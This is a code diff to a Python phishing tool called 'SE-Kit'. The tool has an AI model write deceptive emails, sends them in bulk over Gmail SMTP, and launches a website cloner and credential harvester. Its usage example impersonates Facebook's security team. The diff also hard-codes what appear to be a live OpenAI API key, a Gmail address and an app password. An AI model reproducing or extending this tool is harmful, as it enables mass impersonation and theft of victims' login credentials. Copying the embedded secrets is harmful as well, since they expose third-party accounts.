@@ -6,27 +6,33 @@ import openai
 import argparse
 import sys
 import random
-
+import subprocess
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 #API key for openai
-openai.api_key = "[OpenAI API key]"
+openai.api_key = "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"
 
 #Description and usage for the programs help page
 parser = argparse.ArgumentParser(
-description='SE-Kit is a tool designed for phishing attacks that achieves this through AI-generated phishing emails to trick victims into clicking malicious links',
-usage='-f EmailList.txt -u https://example.com -q "download security extension" -n "BigCompany Security Team"'
+description='SE-Kit is a tool designed for phishing attacks that achieves this through AI-generated phishing emails to trick victims into clicking malicious links with a website cloner and cred harvester',
+usage='-f Email_List.txt -u http://127.0.0.1:8080 -u2 http://facebook.com -q "login to their account" -n "Facebook Security Team"'
 )
 
 #Program switches
 parser.add_argument('-f', '--file', metavar='', type=str, required=True, help="path to file containing list of email recipients")
-parser.add_argument('-u', '--url', metavar='', type=str, required=True, help="malicious link you want to direct the recipient to")
+parser.add_argument('-u', '--url', metavar='', type=str, required=True, help="malicious link you want to direct the recipient to (Enter http://127.0.0.1:8080 if you're using cred harvesting)")
+parser.add_argument('-u2', '--url2', metavar='', type=str, required=True, help="URL that of the web page you want to clone for cred harvesting (Leave this empty if you don't want to clone)")
 parser.add_argument('-q', '--query', metavar='', type=str, required=True, help="what you want the recipient to do e.g. 'download security extension' or 'login to their account'")
 parser.add_argument('-n', '--name', metavar='', type=str, required=True, help="name you want to sign the letter with")
 
 #Parse arguments
 args = parser.parse_args()
+
+URL = args.url2
+
+if args.url2:
+    subprocess.Popen(['start', 'cmd', '/k', f'Harvester.py -u {URL}'], shell=True)
 
 #Read emails from file line by line
 try:
@@ -36,7 +42,7 @@ except argparse.ArgumentTypeError as e:
     print(str(e))
     exit(1)
 	
-from_email = "[Email for sender]"
+from_email = "autoemailer912@gmail.com"
 
 #Asks AI Question
 def ask_openai(query):
@@ -85,7 +91,7 @@ for i, to_email in enumerate(recipients):
         session.starttls()
 
         # Login to account
-        password = "[Email API password for sender]"
+        password = "jxqtvvlxpeutafdl"
         session.login(from_email, password)
 
         # Send email
